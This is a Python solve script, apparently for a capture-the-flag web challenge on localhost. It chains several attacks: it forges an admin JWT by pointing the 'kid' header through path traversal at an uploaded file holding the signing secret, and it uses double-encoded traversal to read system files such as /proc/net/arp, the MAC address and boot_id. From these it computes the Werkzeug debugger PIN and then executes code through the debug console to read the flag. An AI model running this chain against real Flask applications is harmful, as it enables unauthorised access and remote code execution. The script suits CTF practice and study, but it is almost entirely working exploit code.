import hashlib
import html
import secrets
import urllib.parse
from itertools import chain

import jwt
import requests


URL = "http://localhost:1337/"


def gen(pub,priv):
  h = hashlib.sha1()

  for bit in chain(pub, priv):
    if not bit:
      continue
    if isinstance(bit, str):
      bit = bit.encode("utf-8")
    h.update(bit)

  h.update(b'cookiesalt')
  h.update(b'pinsalt')
  
  num = ('%09d' % int(h.hexdigest(), 16))[:9]

  rv = None
  for group_size in 5, 4, 3:
    if len(num) % group_size == 0:
      rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                    for x in range(0, len(num), group_size))
      break
  else:
    rv = num

  return rv


def solve():
  secret = secrets.token_hex(32)

  session = requests.Session()

  # Register a new user
  print("[*] Registering a new user")
  username = secrets.token_hex(32)
  print(f"[*] Username: {username}")
  password = secrets.token_hex(32)
  print(f"[*] Password: {password}")
  data = {"username": username, "password": password}
  r = session.post(URL + "api/register", json=data)
  r.raise_for_status()

  # Login as the new user
  print("\n[*] Logging in as the new user")
  data = {"username": username, "password": password}
  r = session.post(URL + "api/login", json=data)
  r.raise_for_status()
  token = r.json()["token"]
  print(f"[*] JWT: {token}")
  session.cookies.set("token", token)

  # Create a new paste
  print("\n[*] Creating a new paste")
  print(f"[*] New secret: {secret}")
  data = {"content": secret}
  r = session.post(URL + "api/create", json=data)
  r.raise_for_status()
  link = r.json()["link"]
  print(f"[*] Paste link: {URL }/view/{link}")

  # Modify the JWT
  print("\n[*] Modifying the JWT")
  token = session.cookies.get("token")
  print(f"[*] Old JWT: {token}")
  data = jwt.decode(token, options={"verify_signature": False})
  data["admin"] = True
  token = jwt.encode(
    data, secret,
    algorithm="HS256",
    headers={"kid": f"../uploads/{link}"}
  )
  print("[*] New JWT: " + token)
  session.cookies.set("token", token)

  # View the paste
  print("\n[*] Checking if JWT works")
  r = session.get(URL + f"view/{link}")
  r.raise_for_status()
  assert r.url == URL + f"view/{link}"

  # Get required info to create PIN
  print("\n[*] Getting network interface name")
  r = session.get(URL + "/raw/..%252F..%252Fproc/net/arp")
  r.raise_for_status()
  arp = r.text
  print(f"[*] ARP table: \n{arp}")
  net = arp.split("\n")[1].split()[-1]
  print(f"[*] Network interface name: {net}")

  print("[*] Getting MAC address")
  r = session.get(URL + f"/raw/..%252F..%252Fsys/class/net/{net}/address")
  r.raise_for_status()
  mac = r.text.strip()
  print(f"[*] MAC address: {mac}")
  mac = str(int(mac.replace(":", ""), 16))

  print("\n[*] Getting boot ID")
  r = session.get(URL + "/raw/..%252F..%252Fproc/sys/kernel/random/boot_id")
  r.raise_for_status()
  machine_id = r.text.strip()
  print(f"[*] Boot ID: {machine_id}")

  print("\n[*] Getting cgroup info")
  r = session.get(URL + "/raw/..%252F..%252Fproc/self/cgroup")
  r.raise_for_status()
  cgroup = r.text.split("\n")[0].strip().rpartition("/")[2]
  print(f"[*] Cgroup: {cgroup}")

  machine_id += cgroup

  # Generate PIN
  print("\n[*] Generating PIN")
  pub = [
    "app",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.11/site-packages/flask/app.py"
  ]

  priv = [
    mac,
    machine_id
  ]

  pin = gen(pub, priv)
  print(f"[*] PIN: {pin}")

  # Go to console
  print("\n[*] Going to console")
  r = session.get(URL + "/console")
  r.raise_for_status()
  secret = None
  # We need to get the secret in order to send requests directly
  # It is hardcoded in the HTML
  for line in r.text.split("\n"):
    if (
      line.strip().startswith("SECRET = \"") and
      line.strip().endswith("\";")
    ):
      secret = line.strip().split(" = \"")[-1].strip("\";")
      break
  else:
    print("[!] Could not find secret in HTML")
    print("[!] HTML was:")
    print(r.text)
    raise Exception("Could not find secret in HTML")
  print(f"[*] Console secret: {secret}")
  enc_secret = urllib.parse.quote(secret, safe='~()*!\'')

  # Send PIN
  r = session.get(f"{URL }/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={enc_secret}")
  r.raise_for_status()
  assert r.json()["auth"] == True

  # Get flag
  r = session.get(f"{URL }/console?&__debugger__=yes&cmd=print(open(%22%2Fflag.txt%22).read())&frm=0&s={enc_secret}")
  r.raise_for_status()
  assert r.text.startswith(">>>")
  flag = html.unescape("\n".join(r.text.splitlines()[1:]))
  print(f"\n[*] Flag: {flag}")


if __name__ == "__main__":
  solve()